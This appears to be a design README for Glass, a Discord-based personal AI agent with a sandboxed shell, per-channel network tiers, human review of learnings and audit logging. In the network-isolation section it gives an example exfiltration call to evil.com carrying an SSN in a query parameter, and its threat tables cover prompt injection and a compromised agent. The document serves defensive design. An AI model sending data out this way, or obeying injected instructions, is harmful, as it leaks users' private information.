# Glass

*A Claude glass — a small tinted mirror that simplifies and reflects the essence of the world.*

Glass is a personal AI agent that lives in a Discord server. It organizes your life into channels, develops its own personality and tools over time, and keeps your data architecturally contained — security properties are enforced by code and containers, not by prompting.

Named for the [Claude glass](https://en.wikipedia.org/wiki/Claude_glass), a pocket mirror used by 18th-century travelers to see the world reflected in simpler, more essential tones. Claude is also the model powering it.

--- 

Based on [Strix](https://github.com/tkellogg/open-strix), and [OpenClaw](https://openclaw.ai/), built on top of [Pi](https://pi.dev/)

---

## Design Principles

### Chill over comprehensive
A small system that's easy to reason about. Fewer features, done well.

### Architectural security, not aspirational security
If something shouldn't be possible, make it structurally impossible. Network isolation, context separation, and workspace scoping are enforced by code and containers, not by instructions to the LLM.

### Bot and agent are separate things
The **bot** is deterministic code: Discord handlers, cron scheduling, context assembly, audit logging, inbox review, container management. No LLM involvement.

The **agent** is the LLM, invoked by the bot when reasoning is needed. It doesn't run persistently — it gets called with a specific context and returns a response. The bot decides when to call it, what to show it, and what to do with the output.

### The agent has a self
Glass maintains its own persistent identity, personality, knowledge, and self-built skills. These live at the root of the workspace and inform every invocation. The self-creation process is an ongoing project that enhances everything else the agent does.

### Multiplicative identity
Each Discord channel is a separate context — a project, a concern, a facet of your life. The same agent, same personality, but with different knowledge in different rooms. Your Discord server becomes the organizational structure of your life.

---------OLD STUFF BELOW, KEPT FOR REFERENCE---------

## Architecture

### System Overview

```
┌──────────────────────────────────────────────────┐
│  Host (your machine)                             │
│                                                  │
│  ┌──────────────────────────────────────┐        │
│  │  Bot (Rust, deterministic)           │        │
│  │                                      │        │
│  │  Has network:                        │        │
│  │  ├─ Discord API                      │        │
│  │  ├─ Claude API                       │        │
│  │  └─ Web access (host-side, scoped)   │        │
│  │                                      │        │
│  │  Responsibilities:                   │        │
│  │  ├─ Discord event handling           │        │
│  │  ├─ Cron scheduler                   │        │
│  │  ├─ Context assembly                 │        │
│  │  ├─ Tool execution engine            │        │
│  │  ├─ Inbox review UI                  │        │
│  │  ├─ Audit logging                    │        │
│  │  └─ Docker sandbox management        │        │
│  │            │                         │        │
│  │            │ tool calls              │        │
│  │            ▼                         │        │
│  │  ┌──────────────────────────────┐    │        │
│  │  │  Docker (--network none)     │    │        │
│  │  │                              │    │        │
│  │  │  Has shell, has NO network:  │    │        │
│  │  │  ├─ Full filesystem          │    │        │
│  │  │  ├─ Run scripts              │    │        │
│  │  │  ├─ Build tools              │    │        │
│  │  │  └─ Workspace volume         │    │        │
│  │  └──────────────────────────────┘    │        │
│  └──────────────────────────────────────┘        │
└──────────────────────────────────────────────────┘
```

### Projects

Everything in Glass is a project. Each project maps to a Discord channel and a workspace directory. Projects are isolated from each other — when the agent is invoked in a project, it sees only that project's files, conversation history, brief, and status.

There is one special project: the **root project**. It contains the agent's identity, skills, knowledge, and inbox. It sits above the other projects — the agent always carries its identity into every invocation, and the root project is where cross-project coordination happens. But structurally, it is still a project: it has a workspace, a schedule, and a channel (`#glass`).

### Network Isolation

The Docker container runs with `--network none` — no outbound, no inbound, no DNS. The agent's shell environment is fully air-gapped.

Web access (`fetch_url`, `web_search`) is a host-side capability. The agent makes a request, the bot executes it on the host, and passes the content into the LLM context. The bot never writes fetched content into the workspace. The Discord API and Claude API are accessed by the bot process on the host, never from inside the container.

However, even GET-only host-side fetching is an exfiltration channel. A prompt-injected agent can encode workspace data in query parameters (`fetch_url("https://evil.com/?ssn=123")`), URL paths, or subdomains. The URL itself carries data outward even though the content flow is inward.

The mitigation is per-project network capabilities: different projects contain different kinds of data, carry different levels of risk, and need different levels of web access. The bot scopes network tools accordingly.

### Channel Capabilities

Each project has a **network capability** that determines what web access the agent receives when invoked in that project. This is enforced by the bot at the tool-assembly level.

| Capability | Behavior | Exfiltration risk | Intended use |
|---|---|---|---|
| `none` | `fetch_url` and `web_search` are excluded from the tool list entirely. | None | Projects with PII: finances, medical, legal |
| `search` | `web_search` only. Queries go to a known search API; the agent cannot target arbitrary servers. | Negligible — requires access to the search provider's query logs for your API key | Sensitive projects that still benefit from research |
| `allowlist` | `fetch_url` available, but the bot validates each URL against a list of human-approved domains before executing. | Low — approved domains are not attacker-controlled | Projects that need specific external sources |
| `open` | `fetch_url` available for any URL. All requests are audit-logged. | Acceptable when the project contains no sensitive data | Hobbies, side projects, low-stakes work |

Capabilities are defined in `harness/channel_capabilities.toml`, which is in the bot's domain. The agent cannot read or modify this file.

```toml
# harness/channel_capabilities.toml

[default]
network = "open"

[channels.surgery-prep]
network = "search"

[channels.finances]
network = "none"

[channels.baking-adventures]
network = "open"
```

The root project has `network = "open"` implicitly. Its workspace contains identity, skills, and approved abstractions — not project-specific data. If the root is compromised and produces a malicious skill, that skill still runs in Docker with `--network none`, and when the agent is invoked in a restricted project, network tools are excluded from the tool list by the bot. Channel capabilities are enforced at invocation time regardless of what skills exist in the workspace.

**`search` vs. `fetch_url`.** A search query goes to a fixed API endpoint (Brave Search API) that you control via your own API key. The agent cannot choose the destination server. Exfiltration through search queries would require access to Brave's internal query logs for your specific key, which is not a realistic attack surface. This makes `search` a structurally different capability from `fetch_url`, where the agent selects the destination.

### Domain allowlist requests

For projects with `allowlist` capability, the agent can request access to a new domain. The bot handles this through the same Discord review UI used for inbox items:

> **🌐 Domain request** (from #surgery-prep)
> Agent wants to access: `mayoclinic.org`
> Reason: *"Looking up post-operative care guidelines for the procedure type mentioned in notes."*
>
> ✅ Approve · ❌ Reject

On approval, the bot adds the domain to `channel_capabilities.toml`. This is deterministic bot code handling a Discord button interaction — no LLM is involved in the approval.

**Prompt injection resilience by tier:**
- `none`: No web tools are available. Shell-level network calls fail in the air-gapped container.
- `search`: Queries go to a fixed search API. The agent cannot direct requests to an attacker-controlled server.
- `allowlist`: Only human-approved domains are reachable. An attacker would need to socially engineer the owner into approving a malicious domain.
- `open`: Unrestricted, but project isolation ensures no sensitive data is present in the context.

**Integrations.** The capability model extends beyond network tiers. A project may need access to a specific external service (e.g., Linear, Google Calendar) without requiring general web access. These can be expressed as structured integration tools with fixed API surfaces, enabled per-project:

```toml
[channels.side-project]
network = "none"
integrations = ["linear"]
```

An integration tool like `linear_create_issue(title, description)` makes specific API calls through the bot. The agent provides structured fields, not raw URLs, so the exfiltration surface is limited to the integration's defined operations. Integration tools are independent of the network capability tiers and can be enabled alongside any tier. The integration system itself is a future addition; the capability model accommodates it without structural changes.

### Project Isolation

When the agent is invoked in a project, data from other projects is not included in the context.

```
Project: #surgery-prep
  Context includes:
  ├─ Agent identity (root: identity.md, skill metadata)
  ├─ workspace/surgery-prep/ files
  ├─ Conversation history from #surgery-prep only
  └─ Project brief, status, and schedule

Project: #side-project
  Context includes:
  ├─ Agent identity (root: identity.md, skill metadata)
  ├─ workspace/side-project/ files
  ├─ Conversation history from #side-project only
  └─ Project brief, status, and schedule
  (Surgery data is not in this context.)
```

A collaborator invited to `#side-project` who attempts prompt injection cannot access surgery data — it is not present in the LLM context. This is an architectural property, not a behavioral one.

### The Root Project

The root project is where the agent's self lives and where cross-project work happens. Its workspace contains the agent's identity, skills, knowledge, and inbox. Its channel is `#glass`.

The root project has two special properties that other projects do not:

**When the owner is in the conversation,** the root project has full access. The bot mounts the entire workspace (including all project subdirectories), enables all network tools, and provides administrative tools (`create_project`, `archive_project`, `rename_project`). This is Glass as a full personal assistant. The security guarantee is the owner's presence — the owner can see every tool call, every URL, every file read.

**When the owner is not in the conversation** (scheduled tasks), the root project has access to its own workspace and open network for self-directed work (reflection, skill-building, web research), plus the `query_projects` tool for cross-project coordination. The agent sees the list of all active projects in its system prompt and can choose which ones to query. The `query_projects` tool has a special property: when it is called, the bot dispatches a uniform query to each specified project as an independent subagent, collects the responses, and then resumes the invocation with those responses in context but with an empty toolset — no tools registered at all. Claude Code can only produce a text response. This ensures there is never a state where the agent both holds cross-project data and has network access or project file write capability.

Regular projects do not change behavior based on who triggered the invocation. Channel capabilities apply regardless, because project channels may have collaborators and the security model must hold even when the owner is present.

---

## The Inbox: Where Architecture Meets Trust

Each project context can write abstract suggestions to a **host-side pending queue** (outside the workspace, in the bot's domain) via the `suggest_learning` tool. These are intended to be learnings stripped of project specifics:

- ✅ *"Multi-step processes with hard deadlines benefit from backward-planning."*
- ❌ *"The user's surgery is on March 15th at 2pm with Dr. Chen."*

This is the one boundary in the system that is **semantic rather than architectural**. The LLM decides what to abstract, and there is no way to enforce "don't include specifics" with a firewall.

### Human-in-the-loop review

When the agent calls `suggest_learning`, the bot writes the suggestion to its own host-side pending queue (in `harness/pending/`) and posts it to Discord for review:

> **📬 Inbox review** (from #surgery-prep)
> *"Multi-step processes with hard deadlines benefit from backward-planning: start from the deadline and schedule prep steps in reverse."*
>
> ✅ Approve · ❌ Reject · ✏️ Edit

Approval, rejection, and editing are handled by deterministic bot code responding to Discord button interactions. No LLM is involved in the review pipeline. On approval, the bot writes the suggestion to `workspace/inbox/`. On rejection, it is discarded. The agent only sees approved items.

Over time, as trust in the abstraction quality develops, the approval requirement can be loosened.

---

## Directory Structure

```
glass-data/                      # root data directory
  workspace/                     # git repo — the agent's world
    identity.md                  # personality, directives, who Glass is
    skills/                      # self-built skills (SKILL.md directories)
    knowledge/                   # general knowledge and ideas
    inbox/                       # approved suggestions (bot gates entry)
    schedule.json                # root project scheduled tasks

    surgery-prep/                # project workspace
      brief.md                   # what this project is and why it exists
      status.md                  # the here and now — current state, next steps
      notes.md
      schedule.json              # project-specific scheduled tasks

    side-project/                # project workspace
      brief.md
      status.md
      notes.md
      schedule.json

    japan-trip/                  # new projects get new workspaces
      ...

  harness/                       # bot's domain — agent never sees this
    channel_capabilities.toml    # per-project network capabilities
    audit/                       # timestamped JSON logs
      2026-02-05T09-00-00Z_daily-review.json
      2026-02-05T10-23-41Z_user-msg.json
      ...
    pending/                     # inbox suggestions awaiting human review
      from-surgery-prep-2026-02-05.json
      ...
```

**workspace/** is a git repo. The root level contains the agent's identity, skills, and knowledge. Each project is a subdirectory. Every change the agent makes is trackable, diffable, and reversible. New projects automatically get a new workspace directory. The agent can organize files within each project as it sees fit.

**harness/** is the bot's domain — audit logs, pending inbox queue, channel capabilities, and anything else the deterministic code needs. The agent never reads or writes here.

The workspace git repo is accessible to you directly. You can pull it, browse it, edit files, and push changes. The agent sees updates on its next invocation.

---

## Discord Server Structure

```
GLASS SERVER
├─ #glass                # root project — personal assistant, briefings, reflection
├─ #audit-log            # bot posts summaries of all autonomous actions
│
├─ PROJECTS
    ├─ #surgery-prep     # isolated project
    ├─ #side-project     # isolated project
    └─ #japan-trip       # isolated project
```

- **#glass**: The root project channel. Conversations with Glass as a whole, briefing outputs, visible self-reflection. Where you talk to Glass about Glass, or about your life across projects.
- **#audit-log**: Every autonomous action (scheduled tasks, heartbeats) gets a human-readable summary posted here. Write-only from the bot's perspective.
- **Project channels**: Isolated contexts. Collaborators can be invited to specific channels. The agent responds with knowledge scoped to that project only.

---

## Audit System

Every LLM invocation is logged without exception.

### Timestamped JSON files

Each invocation produces a JSON file in the audit directory, named by timestamp:

```
harness/audit/
  2026-02-05T09-00-00Z_daily-review.json
  2026-02-05T10-23-41Z_user-msg.json
  2026-02-05T20-00-00Z_self-reflection.json
```

Each file contains:

```json
{
  "id": "uuid",
  "timestamp": "2026-02-05T09:00:00Z",
  "trigger": {
    "type": "scheduled_task",
    "detail": "cron:daily-review"
  },
  "project": "surgery-prep",
  "prompt_summary": "Review surgery prep timeline and...",
  "full_context": [ "...messages array..." ],
  "response": "...full LLM response...",
  "tool_calls": [
    { "tool": "read_file", "args": {"path": "notes.md"}, "result": "..." },
    { "tool": "fetch_url", "args": {"url": "https://..."}, "result": "..." }
  ],
  "tokens_used": 2847,
  "duration_ms": 4200,
  "status": "success"
}
```

Plain JSON files — accessible to `grep`, `jq`, or any editor. No database. Glass also includes a session playback visualizer for scrolling through an invocation: the assembled context, each tool call and result, and the final response.

### Discord audit channel

For autonomous actions (not direct user messages), the bot asks the agent to summarize what it did and posts the result to #audit-log:

> **🕐 Scheduled task: `daily-review`** · #surgery-prep · 9:00 AM
> Checked your surgery prep timeline against today's date. The pre-op bloodwork deadline is in 3 days and wasn't in your notes yet, so I added it with a reminder. Also pulled the latest prep instructions from the clinic's website and updated your checklist.

User-initiated conversations are not posted to #audit-log — you were present for those. Only autonomous behavior is surfaced, so you can review what the agent did while unattended.

---

## Scheduling

The agent manages its own schedule via JSON files in the workspace. The bot reads these files and runs a cron loop on the host side.

The root project's `schedule.json` covers self-reflection, briefings, and administrative tasks:

```json
{
  "tasks": [
    {
      "id": "morning-briefing",
      "cron": "0 8 * * *",
      "description": "Morning briefing: summarize status and upcoming deadlines across all projects",
      "enabled": true
    },
    {
      "id": "weekly-reflection",
      "cron": "0 20 * * 0",
      "description": "Weekly self-reflection and skill review",
      "enabled": true
    }
  ]
}
```

Individual projects can have their own `schedule.json` for project-specific recurring work:

```json
{
  "tasks": [
    {
      "id": "daily-review",
      "cron": "0 9 * * *",
      "description": "Review surgery prep timeline and update notes",
      "enabled": true
    }
  ]
}
```

- The bot watches all schedule files, runs the cron loop, and invokes the agent with the appropriate project context when a task fires.
- Every scheduled invocation is fully logged in the audit system.
- The agent can modify its own schedules (write to `schedule.json` via shell), and the bot picks up changes on the next cron cycle.

---

## Tools & Skills System

The agent has a fixed set of tools provided by the bot, plus self-built skills from its workspace. Available tools vary by project and context.

### Bot-provided tools (hardcoded, host-side)

**Standard tools** (available in all projects, subject to channel capabilities):

| Tool | Description | Runs on | Governed by |
|------|-------------|---------|-------------|
| `fetch_url` | GET a URL, return text content | Host (has network) | Channel capabilities |
| `web_search` | Search the web, return result snippets | Host (has network) | Channel capabilities |
| `shell` | Execute a command in the sandbox | Container (no network) | Always available |
| `read_file` | Read a file from the current project workspace | Host (path-scoped) | Always available |
| `write_file` | Write a file to the current project workspace | Host (path-scoped) | Always available |
| `list_files` | List files in the current project workspace | Host (path-scoped) | Always available |
| `get_channel_history` | Fetch older Discord messages from this project's channel | Host | Always available |
| `suggest_learning` | Send an abstract learning or concept to Glass for human review | Host (writes to harness/pending/) | Always available |


The bot controls scoping: `read_file` and `write_file` are restricted to the current project's workspace. For regular projects, this is the project's subdirectory. For the root project, this is the root-level workspace files (identity, skills, knowledge, inbox) — or the full workspace when the owner is in the conversation. This is enforced by the bot, not by the agent. List files is recursive and shows all subdirectories and files in the current workspace.

**Dual-path file access.** The workspace is accessible two ways: via MCP file tools (host-side, path-scoped) and via `shell` commands in the Docker container (scoped by what's mounted). Both paths touch the same underlying files. The bot ensures the Docker mount and the MCP path scope always agree — for a project invocation, Docker mounts only that project's subdirectory, matching the MCP path scope. If these ever diverged, the agent could use `shell` to reach files that `read_file` would deny.

**Network tools and channel capabilities.** The bot checks `harness/channel_capabilities.toml` before assembling the tool list for each invocation. If the project's network capability is `none`, `fetch_url` and `web_search` are not included in the tool list. If it's `search`, only `web_search` is included. If it's `allowlist`, `fetch_url` is included but the bot validates each URL against the approved domain list before executing. If it's `open`, `fetch_url` is included without restriction. The agent cannot invoke a tool that was not provided in its tool list, and the bot will not execute a fetch to a disallowed domain.

**Root project tools** (available only in the root project):

| Tool | Description |
|------|-------------|
| `query_projects` | Send a uniform query string to one or more specified projects. The agent provides a list of project names and a query string. The bot dispatches the query to each named project as an independent subagent, collects the responses, then resumes the invocation with responses in context but with an empty toolset — Claude Code can only produce text. Only callable once per invocation. Not available when the owner is in the conversation (not needed — the owner can direct cross-project work interactively). |
| `list_projects` | Returns project names and basic metadata. No file contents. |
| `create_project` | Creates a new Discord channel and workspace directory. |
| `archive_project` | Marks a project as archived. |
| `rename_project` | Renames a channel and its corresponding workspace directory. |

The query sent by `query_projects` is a single string dispatched identically to every project in the specified list. The root project can choose which projects to query, but cannot craft different queries for different projects. This uniformity is enforced by the bot.

### Self-built skills (agent-created, in sandbox)

Skills are modular capabilities that the agent creates for itself over time. They follow the [Claude Agent Skills](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/overview) structure: each skill is a directory containing a `SKILL.md` file with YAML frontmatter, optional instruction files, and optional scripts.

```
workspace/skills/
  backward-planner/
    SKILL.md              # metadata + instructions
    templates/
      timeline.md         # reference template
  research-summarizer/
    SKILL.md
    scripts/
      extract_key_points.py
```

A `SKILL.md` file contains a YAML header for discovery and a body with instructions:

```yaml
---
name: backward-planner
description: Plan multi-step processes by working backward from a deadline.
  Use when a task has a hard due date and multiple dependent steps.
---

# Backward Planner

## Steps
1. Identify the deadline and final deliverable.
2. List all prerequisite steps.
3. Estimate duration for each step.
4. Schedule in reverse from the deadline.

## Templates
See [timeline.md](templates/timeline.md) for the output format.
```

**Progressive disclosure.** The bot loads skill content in stages to manage context efficiently:

| Level | When loaded | What | Context cost |
|---|---|---|---|
| Metadata | Every invocation | `name` and `description` from YAML frontmatter | ~100 tokens per skill |
| Instructions | When the skill is triggered | Full `SKILL.md` body | Varies, typically under 5k tokens |
| Resources | As needed | Additional files, scripts, templates | Only when referenced |

At context assembly, the bot reads the YAML frontmatter from all skill directories and includes the metadata in the system prompt. This is lightweight — the agent can accumulate many skills without inflating every invocation. When the agent decides to use a skill, it reads the full `SKILL.md` via the sandbox. Additional resources and scripts are accessed only when referenced in the instructions.

**Scope.** Skills in `workspace/skills/` (root level) are global — included in every invocation's system prompt metadata. Individual projects may also define skills in their own workspace (e.g., `surgery-prep/skills/`), which are included only when the agent is invoked in that project.

**Security.** All skill scripts execute in the sandbox like any other shell command — `--network none`, no escape. A malicious or broken skill is bounded by the same container isolation and channel capabilities as everything else. The failure mode is that the agent builds a skill that doesn't work and needs to debug it.

---

## Context Assembly

When the bot invokes the agent, it assembles context based on the project:

**Conversation history and workspace memory.** The bot fetches recent Discord messages from the project's channel and includes them in the context. This gives the agent conversational continuity without relying on persistent sessions — each invocation is a fresh Claude Code session, but it can see what was said recently. The agent can fetch older messages via `get_channel_history` when it needs more context.

Workspace memory mechanisms (`status.md`, `notes.md`, project files) coexist with conversation history. Discord messages provide short-term conversational flow; workspace files provide long-term persistent memory that the agent explicitly maintains. Both are needed.

### Regular project invocation
```
System prompt:
  - Agent identity (workspace/identity.md)
  - Available tools and skill metadata (filtered by channel capabilities)
  - Project brief (project/brief.md)
  - Project status (project/status.md)
  - Project workspace file listing

Conversation history:
  - Recent messages from this project's channel
  - Older messages available via get_channel_history

Scoping:
  - read/write restricted to this project's workspace subdirectory
  - Docker mounts only this project's subdirectory (matches MCP path scope)
  - Network tools governed by channel capabilities (none/search/allowlist/open)
  - Can write abstract suggestions to host-side pending queue
  - Cannot read other projects or root-level files (identity and skill metadata
    are loaded by the bot into the system prompt, not accessed through the sandbox)
```

### Root project — owner in conversation
```
System prompt:
  - Agent identity (workspace/identity.md)
  - All tools and skill metadata (standard + root project tools)
  - Root workspace file listing

Context files:
  - Root workspace contents (identity, skills, knowledge, inbox)
  - Project files accessible on request via tools

Conversation history:
  - Recent messages from #glass
  - Older messages available via get_channel_history

Scoping:
  - read/write to full workspace (root + all projects)
  - Docker mounts full workspace (matches MCP path scope)
  - Full network: fetch_url, web_search available
  - Administrative tools available (create/archive/rename project)
```

### Root project — autonomous (scheduled task)
```
System prompt:
  - Agent identity (workspace/identity.md)
  - Standard tools + root project tools + skill metadata
  - Root workspace file listing, project list with metadata

Context files:
  - Root workspace contents (identity, skills, knowledge, inbox)

Scoping:
  - read/write restricted to root-level workspace files
  - Docker mounts root-level workspace only (matches MCP path scope)
  - Cannot read project workspaces directly
  - Network: open (root workspace contains no project-specific data)
  - query_projects available (dispatches uniform query to specified projects,
    then resumes with empty toolset — text response only)
```

---

## Tech Stack

| Component | Technology |
|-----------|-----------|
| Bot runtime | Rust |
| Discord | serenity (Discord API crate) |
| Agent runtime | Claude Code via [claude-sdk-rs](https://github.com/bredmond1019/claude-sdk-rs) (wraps Claude Code CLI) |
| Tool provision | MCP (Model Context Protocol) — Glass runs an MCP server, Claude Code calls it |
| Sandbox | Docker (`--network none`), managed via `tokio::process::Command` / docker CLI |
| Persistence | Workspace volume (files), timestamped JSON files (audit log) |
| Scheduling | tokio cron loop, reading agent-managed schedule.json files |

### Crate dependencies (minimal)
- `claude-sdk-rs` — Claude Code SDK (agent runtime, session management, context window management)
- `serenity` — Discord bot framework
- `reqwest` — HTTP client (web fetch, search — host-side tools only)
- `serde` / `serde_json` — serialization for API, audit logs, configs
- `tokio` — async runtime, timers for scheduling
- `chrono` — timestamps for audit logs

### On the agent runtime

Glass uses Claude Code as the agent runtime rather than owning the agentic loop directly. Claude Code handles the conversation loop, context window management (compaction, summarization), tool calling, session state, and prompt caching. Glass provides tools to Claude Code via MCP and controls what the agent can do at the tool boundary.

The flow for each invocation:

1. Bot assembles context (system prompt from identity + skills metadata + project brief/status)
2. Bot generates a per-invocation MCP config specifying which Glass tools are available (based on channel capabilities)
3. Bot invokes Claude Code via `claude-sdk-rs` with the system prompt, MCP config, and allowed tools
4. Claude Code runs its agentic loop, calling Glass's MCP tools as needed
5. Glass's MCP server executes tools with full security enforcement (Docker sandbox for shell, path scoping for files, capability checks for web access)
6. Claude Code produces a final response → bot posts to Discord

When `query_projects` is called during a root project invocation, Glass handles it as a two-phase invocation: the first Claude Code session completes, the bot detects `query_projects` in the session's tool call records, subagent queries are dispatched (one per specified project, each as its own Claude Code session), and a second Claude Code session is started with the collected responses in context and an empty toolset — Claude Code can only produce a text response.

This approach gives Glass all of Claude Code's evolving capabilities (skills, streaming, prompt caching, context compaction) for free, while maintaining full control over security at the tool execution boundary. Claude Code can be replaced with a custom agentic loop later if needed — it's easier to go this direction than the reverse.

**SDK fallback chain:** First choice is [claude-sdk-rs](https://github.com/bredmond1019/claude-sdk-rs) (Rust, wraps Claude Code CLI). If it's missing features, fall back to the official [Claude Agent SDK](https://platform.claude.com/docs/en/agent-sdk/overview) (TypeScript/Python). Last resort: raw Claude Code CLI via `tokio::process::Command`.

---

## Configuration

Single `.env` file (or environment variables) on the host. Never mounted into the container.

```
DISCORD_BOT_TOKEN=...
DISCORD_GUILD_ID=...
ANTHROPIC_API_KEY=...
BRAVE_SEARCH_API_KEY=...    # for web_search capability (Brave Search API)
WORKSPACE_PATH=./workspace
DOCKER_IMAGE=glass-sandbox
```

Channel capabilities are configured separately in `harness/channel_capabilities.toml` (see Channel Capabilities). This file is managed by the bot and updated via Discord interactions (domain approval buttons). It is not exposed to the agent.

---

## MVP Scope

### Build first
- [ ] Discord bot: connect, listen for messages, respond in channels
- [ ] Context assembly: project detection, workspace mapping, isolation enforcement
- [ ] Claude API integration: send context, receive response, handle tool calls
- [ ] Docker sandbox: `--network none`, persistent workspace volume, shell execution
- [ ] Tool system: `fetch_url`, `web_search`, `shell`, `read_file`, `write_file`, `list_files`
- [ ] Channel capabilities: `harness/channel_capabilities.toml`, per-project network tiers (`none`/`search`/`allowlist`/`open`), tool filtering at context assembly
- [ ] Domain allowlist requests: Discord button approval flow, bot updates capabilities file
- [ ] Root project: identity.md, skills/, knowledge/, inbox/, schedule.json at workspace root
- [ ] Scheduling: cron loop on host, agent-managed schedule.json files
- [ ] Audit log: timestamped JSON files for every invocation
- [ ] Audit channel: #audit-log summaries for autonomous actions
- [ ] Inbox system: host-side pending queue, Discord button review, approved items written to workspace
- [ ] Auto-git sync after agent invocations
- [ ] Root project owner-present mode: full cross-project access in owner conversations
- [ ] `query_projects` tool: subagent dispatch, tool swap after response collection
- [ ] Self-built skill discovery (bot reads SKILL.md frontmatter from workspace/skills/ and project skill directories)
- [ ] Project management tools: `create_project`, `archive_project`, `rename_project`

### Add Next
- [ ] Embedding-based memory / semantic search
- [ ] Admin dashboard (web UI for audit log browsing)

### Add when needed

- [ ] Other model providers
- [ ] Channel integrations: structured per-project integration tools (e.g., Linear, Google Calendar) independent of network tiers

---

## Security Model Summary

| Threat | Mitigation |
|--------|-----------|
| Agent exfiltrates data via shell | Container runs with `--network none`. No endpoint is reachable. |
| Agent exfiltrates data via fetch URLs | Channel capabilities govern web access per project. Sensitive projects use `none` or `search`, preventing arbitrary URL targeting. `allowlist` projects restrict to human-approved domains. `open` projects contain no sensitive data by design. |
| Agent exfiltrates data via search queries | Search queries route to a fixed API endpoint under your API key. Exfiltration would require access to the search provider's internal query logs — not a practical attack surface. |
| Prompt injection via fetched webpage | Project isolation bounds the impact. A compromised agent in a hobby project has no access to medical data. A compromised agent in a medical project has no `fetch_url` tool. |
| Autonomous root relays data between projects | `query_projects` enforces a tool swap: after subagent responses are collected, Phase 2 runs with an empty toolset — no tools registered at all. The agent cannot write to any workspace or make network requests while holding cross-project data. |
| Compromised root produces malicious skills | Self-built skills execute in Docker with `--network none`. Channel capabilities are enforced by the bot at invocation time regardless of what skills exist in the workspace. Recovery: `git revert` the workspace. |
| Collaborator prompt-injects to access other projects | Other project data is not present in the LLM context. There is nothing to extract. |
| Malicious community plugins / skills | There is no plugin system. Tools are either hardcoded bot code or agent-created skills in the sandbox. |
| Agent leaks project details into root workspace | Inbox items require human review before reaching the root workspace. |
| Agent runs destructive shell commands | The sandbox is disposable. Recovery: `docker rm` and recreate from the workspace volume. |
| Compromised LLM API | Bot code is deterministic and validates tool call structure. The sandbox limits blast radius. |

---

*"The person using it ought always to turn his back to the object that he views."*
*— Thomas West, A Guide to the Lakes (1778)*
